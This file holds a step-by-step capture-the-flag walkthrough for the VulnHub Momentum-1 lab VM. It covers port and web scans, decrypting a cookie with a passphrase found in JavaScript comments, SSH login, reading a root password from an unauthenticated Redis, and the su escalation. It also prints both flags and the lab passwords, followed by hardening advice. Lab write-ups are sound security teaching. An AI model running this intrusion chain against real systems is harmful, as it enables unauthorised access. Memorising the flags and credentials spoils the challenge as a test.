@@ -1,0 +1,364 @@
+================================================================================
+Momentum-1 CTF - Technical Solution Guide
+https://www.vulnhub.com/entry/momentum-1,685/
+================================================================================
+
+OBJECTIVE: Get the root flag
+DIFFICULTY: Easy-Medium
+TARGET IP: 10.0.2.239
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Network scan
+nmap -sS -sV -A -p- 10.0.2.239
+
+Target: 10.0.2.239
+Open Ports:
+  22/tcp - open (OpenSSH 7.9p1 Debian)
+  80/tcp - open (Apache httpd 2.4.38 Debian)
+
+# Key observation
+Standard SSH and HTTP ports open. Web server will be the initial entry point.
+
+# Web vulnerability scan
+nikto -h http://10.0.2.239
+
+Findings:
+  - Apache/2.4.38 (outdated)
+  - Directory indexing enabled on /css/ and /img/
+  - Missing security headers (X-Frame-Options, X-Content-Type-Options)
+  - /manual/ directory accessible
+
+================================================================================
+[2] WEB APPLICATION ANALYSIS
+================================================================================
+
+# Directory enumeration
+gobuster dir -u http://10.0.2.239/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.js,.bak,.txt
+
+Discovered:
+  index.html    (Status: 200)
+  /img/         (Status: 301)
+  /css/         (Status: 301)
+  /js/          (Status: 301)
+  /manual/      (Status: 301)
+
+# Source code inspection
+curl http://10.0.2.239/
+view-source:http://10.0.2.239/
+
+# Critical discovery in HTML source
+<head>
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <script type="text/javascript" src="js/main.js"></script>
+    <title>Momentum | Index </title>
+</head>
+
+# Analyzing JavaScript files
+curl http://10.0.2.239/js/main.js
+
+Content:
+  function viewDetails(str) {
+    window.location.href = "opus-details.php?id="+str;
+  }
+
+  /*
+  var CryptoJS = require("crypto-js");
+  var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
+  console.log(decrypted.toString(CryptoJS.enc.Utf8));
+  */
+
+# Important findings
+- PHP endpoint: opus-details.php (potential vulnerability point)
+- Commented code reveals AES decryption logic
+- Passphrase discovered: "SecretPassphraseMomentum"
+
+================================================================================
+[3] CREDENTIAL DISCOVERY
+================================================================================
+
+# Browser console inspection
+Open browser developer tools → Console tab
+> document.cookie
+
+Output:
+  cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt
+
+# AES decryption
+# Tool: https://www.browserling.com/tools/aes-decrypt
+# Alternative: CryptoJS library
+
+Encrypted text: U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt
+Passphrase: SecretPassphraseMomentum
+
+Decrypted output: auxerre-alienum##
+
+# Credential analysis
+Based on web enumeration and decrypted data:
+  Username: auxerre (common CTF pattern: username from context)
+  Password: auxerre-alienum##
+
+================================================================================
+[4] INITIAL ACCESS - SSH
+================================================================================
+
+# SSH connection attempt
+ssh auxerre@10.0.2.239
+Password: auxerre-alienum##
+
+# Connection successful
+auxerre@Momentum:~$ whoami
+auxerre
+
+auxerre@Momentum:~$ pwd
+/home/auxerre
+
+auxerre@Momentum:~$ ls -l
+total 4
+-rwx------ 1 auxerre auxerre 146 Apr 22  2021 user.txt
+
+# First flag
+auxerre@Momentum:~$ cat user.txt
+[ Momentum - User Owned ]
+---------------------------------------
+flag : 84157165c30ad34d18945b647ec7f647
+---------------------------------------
+
+FLAG 1: 84157165c30ad34d18945b647ec7f647
+
+================================================================================
+[5] ENUMERATION - SERVICE DISCOVERY
+================================================================================
+
+# Check listening ports
+auxerre@Momentum:~$ ss -tlnp
+
+State    Recv-Q   Send-Q   Local Address:Port    Peer Address:Port
+LISTEN   0        128            0.0.0.0:22           0.0.0.0:*
+LISTEN   0        128          127.0.0.1:6379         0.0.0.0:*
+LISTEN   0        128                  *:80                 *:*
+LISTEN   0        128               [::]:22              [::]:*
+LISTEN   0        128              [::1]:6379            [::]:*
+
+# Critical finding: Port 6379 (Redis) running on localhost
+# Redis service detected - potential credential storage location
+# Redis is an in-memory key-value database often used for caching
+
+================================================================================
+[6] REDIS DATABASE EXPLOITATION
+================================================================================
+
+# Connect to Redis server
+auxerre@Momentum:~$ redis-cli
+127.0.0.1:6379>
+
+# List all keys
+127.0.0.1:6379> KEYS *
+1) "rootpass"
+
+# Critical discovery: Key named "rootpass" exists
+
+# Retrieve root password
+127.0.0.1:6379> GET "rootpass"
+"m0mentum-al1enum##"
+
+# Redis database contained root credentials in plain text
+Root Password: m0mentum-al1enum##
+
+# Exit Redis
+127.0.0.1:6379> exit
+
+================================================================================
+[7] PRIVILEGE ESCALATION - ROOT ACCESS
+================================================================================
+
+# Switch to root user
+auxerre@Momentum:~$ su -l
+Password: m0mentum-al1enum##
+
+# Verify root access
+root@Momentum:~# whoami
+root
+
+root@Momentum:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@Momentum:~# pwd
+/root
+
+# List root directory
+root@Momentum:~# ls -la
+total 28
+drwx------  3 root root 4096 Apr 22  2021 .
+drwxr-xr-x 18 root root 4096 Jun 28  2020 ..
+-rw-------  1 root root    0 Apr 22  2021 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwxr-xr-x  3 root root 4096 Jun 28  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rwx------  1 root root  150 Apr 22  2021 root.txt
+
+# Read root flag
+root@Momentum:~# cat root.txt
+[ Momentum - Rooted ]
+---------------------------------------
+Flag : 658ff660fdac0b079ea78238e5996e40
+---------------------------------------
+by alienum with <3
+
+FLAG 2: 658ff660fdac0b079ea78238e5996e40
+
+================================================================================
+[8] FLAGS SUMMARY
+================================================================================
+
+Flag 1: 84157165c30ad34d18945b647ec7f647  (Location: /home/auxerre/user.txt)
+Flag 2: 658ff660fdac0b079ea78238e5996e40  (Location: /root/root.txt)
+
+================================================================================
+[9] VULNERABILITIES EXPLOITED
+================================================================================
+
+1. Information Disclosure via Client-Side Code
+   - Commented JavaScript revealed encryption algorithm and passphrase
+   - Source code exposed sensitive implementation details
+   - No obfuscation or protection of client-side secrets
+
+2. Insecure Credential Storage (Cookies)
+   - User credentials stored in browser cookies
+   - Weak encryption implementation with hardcoded passphrase
+   - AES passphrase exposed in JavaScript comments
+
+3. Insecure Redis Configuration
+   - Redis server accessible without authentication
+   - Sensitive credentials stored in plain text
+   - No access controls or password protection enabled
+   - Database listening on localhost (security through obscurity)
+
+4. Credential Reuse
+   - Root password stored in accessible database
+   - No password hashing or encryption in Redis
+   - Direct root access via su command
+
+5. Missing Security Headers
+   - X-Frame-Options not set (clickjacking vulnerability)
+   - X-Content-Type-Options missing
+   - No Content Security Policy (CSP)
+
+================================================================================
+[10] TOOLS USED
+================================================================================
+
+- Nmap 7.98           : Network scanning and service enumeration
+- Nikto 2.5.0         : Web server vulnerability scanner
+- Gobuster 3.8.2      : Directory and file enumeration
+- curl                : HTTP requests and file retrieval
+- Browser DevTools    : Cookie inspection and JavaScript analysis
+- Online AES Decrypt  : Cookie decryption (browserling.com)
+- OpenSSH             : Remote access client
+- redis-cli           : Redis database client
+- ss          : Network service enumeration
+
+================================================================================
+[11] SECURITY RECOMMENDATIONS
+================================================================================
+
+1. Client-Side Security
+   - Never include sensitive information in client-side code
+   - Remove all commented code from production JavaScript
+   - Implement proper encryption with server-side key management
+   - Use secure session management instead of cookie-based credentials
+
+2. Cookie Security
+   - Set HttpOnly flag to prevent JavaScript access
+   - Use Secure flag for HTTPS-only transmission
+   - Implement SameSite attribute to prevent CSRF
+   - Never store passwords or sensitive data in cookies
+
+3. Redis Security
+   - Enable authentication (requirepass directive)
+   - Bind Redis to 127.0.0.1 only if remote access not needed
+   - Use Redis ACL for fine-grained access control
+   - Encrypt sensitive data before storage
+   - Regular security audits of stored keys
+
+4. Credential Management
+   - Never store passwords in plain text
+   - Use strong hashing algorithms (bcrypt, Argon2)
+   - Implement proper password policies
+   - Use environment variables for sensitive configuration
+   - Avoid credential reuse across services
+
+5. Web Application Security
+   - Implement all recommended security headers
+   - Use HTTPS/TLS for all traffic
+   - Regular security assessments and code reviews
+   - Follow OWASP secure coding practices
+   - Disable directory indexing
+
+6. System Hardening
+   - Keep all software and packages updated
+   - Implement principle of least privilege
+   - Use sudo instead of direct root login
+   - Enable and configure firewall rules
+   - Monitor and log all authentication attempts
+
+================================================================================
+[12] ATTACK CHAIN SUMMARY
+================================================================================
+
+Nmap port scan (22, 80)
+    ↓
+Web enumeration (Gobuster, Nikto)
+    ↓
+JavaScript source code analysis (main.js)
+    ↓
+AES passphrase discovery (SecretPassphraseMomentum)
+    ↓
+Browser cookie extraction (document.cookie)
+    ↓
+AES decryption of cookie value
+    ↓
+SSH credential obtained (auxerre:auxerre-alienum##)
+    ↓
+SSH login successful
+    ↓
+User flag capture (/home/auxerre/user.txt)
+    ↓
+Service enumeration (ss -tlnp)
+    ↓
+Redis discovery (port 6379)
+    ↓
+Redis connection (redis-cli)
+    ↓
+Database enumeration (KEYS *)
+    ↓
+Root password extraction (GET rootpass)
+    ↓
+Privilege escalation (su -l)
+    ↓
+Root flag capture (/root/root.txt)
+    ↓
+Complete system compromise
+
+================================================================================
+[13] REFERENCES
+================================================================================
+
+- VulnHub Momentum-1: https://www.vulnhub.com/entry/momentum-1,685/
+- Redis Security: https://redis.io/docs/management/security/
+- OWASP Top 10: https://owasp.org/www-project-top-ten/
+- Redis Quick Start: https://redis.io/docs/getting-started/
+- AES Encryption: https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
+- Cookie Security: https://owasp.org/www-community/controls/SecureCookieAttribute
+
+================================================================================
+[14] DISCLAIMER
+================================================================================
+
+This writeup is for educational purposes only. All techniques demonstrated
+should only be used on systems you own or have explicit permission to test.
+Unauthorized access to computer systems is illegal.
+
+================================================================================
